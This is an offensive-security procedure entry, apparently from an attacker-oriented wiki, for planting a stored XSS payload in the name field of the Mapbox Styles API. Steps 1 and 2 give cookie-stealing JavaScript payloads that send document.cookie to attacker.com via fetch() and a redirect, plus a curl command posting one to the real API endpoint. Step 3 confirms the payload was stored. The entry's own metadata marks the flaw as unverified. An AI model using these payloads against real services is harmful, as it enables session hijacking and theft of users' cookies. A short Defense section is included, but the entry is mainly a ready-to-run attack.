---
id: proc-inject-mapbox-xss
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-styles-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:55.322Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Mapbox-Styles-Name

## Summary

This procedure injects a malicious JavaScript payload into the 'Styles name' field of the Mapbox Styles API, exploiting insufficient input sanitization to store the payload persistently on the server for later execution.

## Description

In the Mapbox Styles API at api.mapbox.com, the name field for creating or updating styles accepts user input without proper HTML/JS escaping. An attacker with API access can submit a payload like `<script>alert('XSS')</script>`, which is stored and returned in JSON responses. This sets up a stored XSS attack, where victims accessing the style retrieve and potentially execute the payload. The procedure requires a valid access token and targets the POST endpoint for style creation.

## Requirements

1. Valid Mapbox access token for authenticated API calls
2. Access to curl or similar HTTP client for sending requests
3. Knowledge of the target username and style ID

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding for all user-controlled fields, especially in API responses
- Add Content-Security-Policy (CSP) headers to prevent inline script execution
- Monitor API logs for suspicious payloads containing script tags

## Objectives

1. Persist malicious JavaScript on the Mapbox server via the Styles name field
2. Prepare for client-side execution in vulnerable browsers
3. Enable potential data exfiltration or session hijacking

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Craft a JavaScript payload that evades basic detection, such as one that steals cookies or beacons to an attacker server.

No command needed; define payload as `payload="<script>fetch('http://attacker.com/steal?data='+encodeURIComponent(document.cookie))</script>"`.

### Step 2: Submit Payload via API

**Context**: Use an HTTP POST request to the Styles API to create or update a style with the payload in the name field.

**Command** ([[commands/curl-post-styles-payload]]):
```bash
curl -X POST "https://api.mapbox.com/styles/v1/{username}/{style_id}?access_token={your_token}" \
  -H "Content-Type: application/json" \
  -d '{"name": "<script>alert(\"XSS\"); document.location=\"http://attacker.com?cookie=\"+document.cookie;</script>"}'
```

> This command sends the JSON payload to the endpoint. Replace {username}, {style_id}, and {your_token} with actual values. Expected output is a 200 OK with the style details, including the unsanitized name.

### Step 3: Verify Storage

**Context**: Retrieve the style to confirm the payload is stored without modification.

**Command** ([[commands/curl-get-styles-retrieve]]):
```bash
curl -X GET "https://api.mapbox.com/styles/v1/{username}/{style_id}?access_token={your_token}"
```

> The response JSON should include the injected script in the "name" field, confirming persistence.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-styles-payload]]
- [[commands/curl-get-styles-retrieve]]

## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[mapbox]]
